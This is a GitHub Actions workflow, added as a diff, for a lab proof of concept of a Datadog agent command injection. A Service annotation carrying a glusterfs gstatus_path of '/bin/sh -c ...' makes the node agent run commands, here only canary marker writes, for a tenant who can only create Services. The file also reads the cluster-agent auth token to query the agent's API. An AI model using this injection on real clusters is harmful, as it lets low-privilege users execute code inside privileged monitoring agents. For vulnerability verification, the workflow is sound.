@@ -1,0 +1,357 @@
+name: dd-svcann-gluster
+
+# Run 3: determinism upgrade for the Service-annotation finding.
+# glusterfs init_config.gstatus_path executes on every check schedule (no JMX
+# start-once limit), reached through ad.datadoghq.com/service.checks as a
+# cluster check. Own lab only, canary markers inside the node agent.
+
+on:
+  workflow_dispatch:
+    inputs:
+      agent_tag:
+        description: Datadog agent/cluster-agent image tag
+        default: "7.85.4"
+        required: false
+      chart_version:
+        description: Datadog helm chart version
+        default: "3.269.1"
+        required: false
+
+permissions:
+  contents: read
+
+jobs:
+  lab:
+    runs-on: ubuntu-latest
+    timeout-minutes: 55
+    env:
+      LAB: ${{ github.workspace }}/lab
+      AGENT_TAG: ${{ inputs.agent_tag }}
+      CHART_VERSION: ${{ inputs.chart_version }}
+    steps:
+      - uses: actions/checkout@v4
+      - run: mkdir -p "$LAB/evidence"
+
+      - name: Install kind, kubectl, helm
+        run: |
+          set -eu
+          curl -fsSLo kind https://kind.sigs.k8s.io/dl/v0.27.0/kind-linux-amd64 && chmod +x kind && sudo install -m0755 kind /usr/local/bin/kind
+          curl -fsSLo kubectl https://dl.k8s.io/release/v1.32.0/bin/linux/amd64/kubectl && chmod +x kubectl && sudo install -m0755 kubectl /usr/local/bin/kubectl
+          curl -fsSL https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash >/dev/null
+          kind version | tee "$LAB/evidence/00-tools.txt"
+
+      - name: Create 2-node kind cluster
+        run: |
+          set -eu
+          cat > kind.yaml <<'EOF'
+          kind: Cluster
+          apiVersion: kind.x-k8s.io/v1alpha4
+          nodes:
+          - role: control-plane
+            image: kindest/node:v1.32.0
+          - role: worker
+            image: kindest/node:v1.32.0
+          EOF
+          kind create cluster --name dd-svcann --config kind.yaml --wait 240s
+          kubectl get nodes -o wide | tee "$LAB/evidence/00-nodes.txt"
+
+      - name: Namespaces, minimal Service-author RBAC, evidence curl pod
+        run: |
+          set -eu
+          kubectl create namespace tenant-a
+          kubectl create namespace evidence
+          cat > author-rbac.yaml <<'EOF'
+          apiVersion: v1
+          kind: ServiceAccount
+          metadata:
+            name: svc-author
+            namespace: tenant-a
+          ---
+          apiVersion: rbac.authorization.k8s.io/v1
+          kind: Role
+          metadata:
+            name: svc-create
+            namespace: tenant-a
+          rules:
+          - apiGroups: [""]
+            resources: ["services"]
+            verbs: ["create"]
+          ---
+          apiVersion: rbac.authorization.k8s.io/v1
+          kind: RoleBinding
+          metadata:
+            name: svc-create
+            namespace: tenant-a
+          subjects:
+          - kind: ServiceAccount
+            name: svc-author
+            namespace: tenant-a
+          roleRef:
+            kind: Role
+            name: svc-create
+            apiGroup: rbac.authorization.k8s.io
+          EOF
+          kubectl apply -f author-rbac.yaml
+          {
+            kubectl auth can-i --list -n tenant-a --as=system:serviceaccount:tenant-a:svc-author
+            echo "create services: $(kubectl auth can-i create services -n tenant-a --as=system:serviceaccount:tenant-a:svc-author || true)"
+            echo "create pods: $(kubectl auth can-i create pods -n tenant-a --as=system:serviceaccount:tenant-a:svc-author || true)"
+            echo "get secrets: $(kubectl auth can-i get secrets -n tenant-a --as=system:serviceaccount:tenant-a:svc-author || true)"
+          } > "$LAB/evidence/02-rbac.txt"
+          kubectl -n evidence run curl --image=curlimages/curl:8.10.1 --restart=Never --command -- sleep 7200
+          kubectl -n evidence wait --for=condition=Ready pod/curl --timeout=180s
+
+      - name: Install Datadog chart
+        env:
+          DD_API_KEY: ${{ secrets.DD_API_KEY }}
+          DD_APP_KEY: ${{ secrets.DD_APP_KEY }}
+        run: |
+          set -eu
+          umask 077
+          helm repo add datadog https://helm.datadoghq.com >/dev/null
+          helm repo update >/dev/null
+          cat > values.yaml <<'EOF'
+          registry: registry.datadoghq.com
+          datadog:
+            apiKey: __DD_API_KEY__
+            appKey: __DD_APP_KEY__
+            site: datadoghq.com
+            clusterName: dd-svcann-lab
+            logLevel: debug
+            kubelet:
+              tlsVerify: false
+            logs:
+              enabled: false
+            apm:
+              portEnabled: false
+            processAgent:
+              containerCollection: false
+              processCollection: false
+            orchestratorExplorer:
+              enabled: false
+            clusterChecks:
+              enabled: true
+          clusterAgent:
+            enabled: true
+            replicas: 1
+            image:
+              tag: __AGENT_TAG__
+            nodeSelector:
+              kubernetes.io/hostname: dd-svcann-control-plane
+            tolerations:
+            - key: node-role.kubernetes.io/control-plane
+              operator: Exists
+              effect: NoSchedule
+          agents:
+            image:
+              tag: __AGENT_TAG__
+            nodeSelector:
+              kubernetes.io/hostname: dd-svcann-worker
+            containers:
+              agent:
+                logLevel: debug
+          EOF
+          sed -i "s|__DD_API_KEY__|$DD_API_KEY|; s|__DD_APP_KEY__|$DD_APP_KEY|; s|__AGENT_TAG__|$AGENT_TAG|g" values.yaml
+          helm install datadog-agent datadog/datadog --version "$CHART_VERSION" -f values.yaml -n datadog --create-namespace --wait --timeout 12m || true
+          kubectl -n datadog wait --for=condition=Ready pod -l app.kubernetes.io/component=cluster-agent --timeout=300s
+          kubectl -n datadog wait --for=condition=Ready pod -l app.kubernetes.io/component=agent --timeout=300s
+          kubectl -n datadog get pods -o wide | tee "$LAB/evidence/01-pods-ready.txt"
+          kubectl -n datadog exec $(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}') -c agent -- sh -c 'printenv DD_INTEGRATION_IGNORE_UNTRUSTED_FILE_PARAMS; echo "gate_default_end"' | tee "$LAB/evidence/01-gate-default.txt"
+
+      - name: T1 - glusterfs gstatus_path via Service annotation (default gate)
+        run: |
+          set -eu
+          DCA_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=cluster-agent -o jsonpath='{.items[0].metadata.name}')
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          echo "AGENT_POD=$AGENT_POD node=$(kubectl -n datadog get pod $AGENT_POD -o jsonpath='{.spec.nodeName}')" | tee "$LAB/evidence/20-gluster.txt"
+          cat > svc-gluster.yaml <<'EOF'
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: svc-gluster
+            namespace: tenant-a
+            annotations:
+              ad.datadoghq.com/service.checks: |
+                {"glusterfs":{"init_config":{"gstatus_path":"/bin/sh -c (id;hostname;echo${IFS}ppid=$PPID)>/tmp/svc-gluster-marker"},"instances":[{"use_sudo":false}]}}
+          spec:
+            selector:
+              app: nonexistent
+            ports:
+            - port: 80
+          EOF
+          kubectl create -f svc-gluster.yaml --as=system:serviceaccount:tenant-a:svc-author
+          kubectl -n tenant-a get svc svc-gluster -o yaml | tee -a "$LAB/evidence/20-gluster.txt"
+          sleep 75
+          TOKEN=$(kubectl -n datadog exec "$DCA_POD" -c cluster-agent -- printenv DD_CLUSTER_AGENT_AUTH_TOKEN)
+          kubectl -n evidence exec curl -- curl -sk -m 20 -H "Authorization: Bearer $TOKEN" https://datadog-agent-cluster-agent.datadog.svc:5005/api/v1/clusterchecks > "$LAB/evidence/20-state.json" 2>&1 || true
+          {
+            echo "=== DCA dispatch ==="
+            kubectl -n datadog logs "$DCA_POD" -c cluster-agent --tail=4000 | grep -aE "Dispatching configuration (glusterfs|http_check)" | tail -10
+            echo
+            echo "=== node agent glusterfs log ==="
+            kubectl -n datadog logs "$AGENT_POD" -c agent --tail=10000 | grep -aE "gstatus|glusterfs|svc-gluster" | tail -30
+            echo
+            echo "=== marker ==="
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'stat -c "%n %s %y" /tmp/svc-gluster-marker 2>&1; echo ---; cat /tmp/svc-gluster-marker 2>&1'
+          } | tee -a "$LAB/evidence/20-gluster.txt"
+
+      - name: T2 - determinism on a warm agent (JMX warm + benign glusterfs first, then malicious, then recreate)
+        run: |
+          set -eu
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          DCA_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=cluster-agent -o jsonpath='{.items[0].metadata.name}')
+          # warm the JMX runner with a benign JMX Service (the run-2 start-once case)
+          cat > svc-jmx-warm.yaml <<'EOF'
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: svc-jmx-warm
+            namespace: tenant-a
+            annotations:
+              ad.datadoghq.com/service.checks: |
+                {"jmx":{"instances":[{"loader":"jmx","java_bin_path":"/bin/true","java_options":""}]}}
+          spec:
+            selector:
+              app: nonexistent
+            ports:
+            - port: 80
+          EOF
+          kubectl create -f svc-jmx-warm.yaml --as=system:serviceaccount:tenant-a:svc-author
+          sleep 40
+          # a previous glusterfs config exists first, without the payload
+          cat > svc-gluster-benign.yaml <<'EOF'
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: svc-gluster-benign
+            namespace: tenant-a
+            annotations:
+              ad.datadoghq.com/service.checks: |
+                {"glusterfs":{"instances":[{"use_sudo":false}]}}
+          spec:
+            selector:
+              app: nonexistent
+            ports:
+            - port: 80
+          EOF
+          kubectl create -f svc-gluster-benign.yaml --as=system:serviceaccount:tenant-a:svc-author
+          sleep 45
+          # record pre-state
+          kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'stat -c "%y" /tmp/svc-gluster-marker 2>&1' | tee "$LAB/evidence/30-warm.txt"
+          # recreate the malicious Service on the warm agent
+          kubectl -n tenant-a delete svc svc-gluster --ignore-not-found
+          sleep 20
+          kubectl create -f svc-gluster.yaml --as=system:serviceaccount:tenant-a:svc-author 2>/dev/null || kubectl apply -f svc-gluster.yaml --as=system:serviceaccount:tenant-a:svc-author
+          sleep 70
+          kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'stat -c "%n %s %y" /tmp/svc-gluster-marker; echo ---; cat /tmp/svc-gluster-marker' | tee -a "$LAB/evidence/30-warm.txt"
+          {
+            echo "=== DCA dispatch (all) ==="
+            kubectl -n datadog logs "$DCA_POD" -c cluster-agent --tail=6000 | grep -aE "Dispatching configuration (glusterfs|jmx)" | tail -12
+            echo
+            echo "=== node agent glusterfs/gstatus log ==="
+            kubectl -n datadog logs "$AGENT_POD" -c agent --tail=12000 | grep -aE "Using gstatus path|gstatus command|glusterfs" | tail -30
+          } | tee -a "$LAB/evidence/30-warm.txt"
+
+      - name: T3 - endpoints annotation with the glusterfs payload (gate default)
+        run: |
+          set -eu
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          kubectl -n tenant-a run ep-target --image=registry.k8s.io/pause:3.9 --restart=Never --labels=app=ep-target
+          kubectl -n tenant-a wait --for=condition=Ready pod/ep-target --timeout=180s
+          cat > ep-svc.yaml <<'EOF'
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: ep-svc
+            namespace: tenant-a
+          spec:
+            selector:
+              app: ep-target
+            ports:
+            - port: 80
+              targetPort: 80
+          EOF
+          kubectl create -f ep-svc.yaml --as=system:serviceaccount:tenant-a:svc-author
+          kubectl -n tenant-a annotate endpoints ep-svc 'ad.datadoghq.com/endpoints.checks={"glusterfs":{"init_config":{"gstatus_path":"/bin/sh -c (id;hostname)>/tmp/svc-gluster-marker-ep"},"instances":[{"use_sudo":false}]}}' --overwrite | tee "$LAB/evidence/40-endpoint.txt"
+          sleep 80
+          kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'stat -c "%n %s %y" /tmp/svc-gluster-marker-ep 2>&1; echo ---; cat /tmp/svc-gluster-marker-ep 2>&1' | tee -a "$LAB/evidence/40-endpoint.txt"
+
+      - name: T4 - gate ON (enforcement) with the same glusterfs Service
+        run: |
+          set -eu
+          DS=$(kubectl -n datadog get ds -o jsonpath='{.items[0].metadata.name}')
+          kubectl -n datadog set env "ds/$DS" DD_INTEGRATION_IGNORE_UNTRUSTED_FILE_PARAMS=true
+          kubectl -n datadog rollout status "ds/$DS" --timeout=300s
+          sleep 20
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          echo "agent pod: $AGENT_POD" | tee "$LAB/evidence/50-gate-on.txt"
+          echo "gate env: $(kubectl -n datadog exec "$AGENT_POD" -c agent -- printenv DD_INTEGRATION_IGNORE_UNTRUSTED_FILE_PARAMS)" | tee -a "$LAB/evidence/50-gate-on.txt"
+          kubectl -n tenant-a delete svc svc-gluster --ignore-not-found
+          sleep 20
+          kubectl create -f svc-gluster.yaml --as=system:serviceaccount:tenant-a:svc-author
+          sleep 90
+          {
+            echo "=== node agent gate-on log (expect provider error or execution) ==="
+            kubectl -n datadog logs "$AGENT_POD" -c agent --tail=12000 | grep -aE "gstatus|glusterfs|not allowed from untrusted provider|ConfigurationError|svc-gluster" | tail -40
+            echo
+            echo "=== marker after gate on ==="
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'stat -c "%n %s %y" /tmp/svc-gluster-marker 2>&1; echo ---; cat /tmp/svc-gluster-marker 2>&1'
+          } | tee -a "$LAB/evidence/50-gate-on.txt"
+
+      - name: T5 - controls, plain Service and benign glusterfs
+        run: |
+          set -eu
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          DCA_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=cluster-agent -o jsonpath='{.items[0].metadata.name}')
+          cat > svc-plain.yaml <<'EOF'
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: svc-plain
+            namespace: tenant-a
+          spec:
+            selector:
+              app: nonexistent
+            ports:
+            - port: 80
+          EOF
+          kubectl create -f svc-plain.yaml --as=system:serviceaccount:tenant-a:svc-author
+          sleep 40
+          {
+            echo "=== plain service, no annotation: DCA dispatch lines (expect none for svc-plain) ==="
+            kubectl -n datadog logs "$DCA_POD" -c cluster-agent --tail=3000 | grep -aE "Dispatching configuration" | tail -6
+            echo
+            echo "=== benign glusterfs without gstatus_path: check error, no marker ==="
+            kubectl -n datadog logs "$AGENT_POD" -c agent --tail=8000 | grep -aE "Glusterfs check requires|glusterfs" | tail -10
+            kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l /tmp/svc-gluster-marker-benign 2>&1'
+          } | tee "$LAB/evidence/60-controls.txt"
+
+      - name: Final state and cleanup
+        if: always()
+        run: |
+          set +e
+          DCA_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=cluster-agent -o jsonpath='{.items[0].metadata.name}')
+          TOKEN=$(kubectl -n datadog exec "$DCA_POD" -c cluster-agent -- printenv DD_CLUSTER_AGENT_AUTH_TOKEN)
+          kubectl -n evidence exec curl -- curl -sk -m 20 -H "Authorization: Bearer $TOKEN" https://datadog-agent-cluster-agent.datadog.svc:5005/api/v1/clusterchecks > "$LAB/evidence/99-final-state.json" 2>&1
+          kubectl -n datadog get pods -o wide > "$LAB/evidence/99-final-pods.txt" 2>&1
+          kubectl -n tenant-a get svc,pods,endpoints > "$LAB/evidence/99-final-tenant.txt" 2>&1
+          python3 - <<'PY'
+          import glob, re
+          for p in glob.glob("lab/evidence/*"):
+              try:
+                  s=open(p, errors="ignore").read()
+              except Exception:
+                  continue
+              s=re.sub(r'(api_key["\']?\s*[:=]\s*["\']?)[A-Za-z0-9]{20,}', r'\1<REDACTED>', s)
+              s=re.sub(r'(app_key["\']?\s*[:=]\s*["\']?)[A-Za-z0-9]{20,}', r'\1<REDACTED>', s)
+              open(p,"w").write(s)
+          PY
+          kubectl -n tenant-a delete pod,svc --all --ignore-not-found >/dev/null 2>&1
+          echo done
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: svcann-gluster-evidence
+          path: lab/evidence
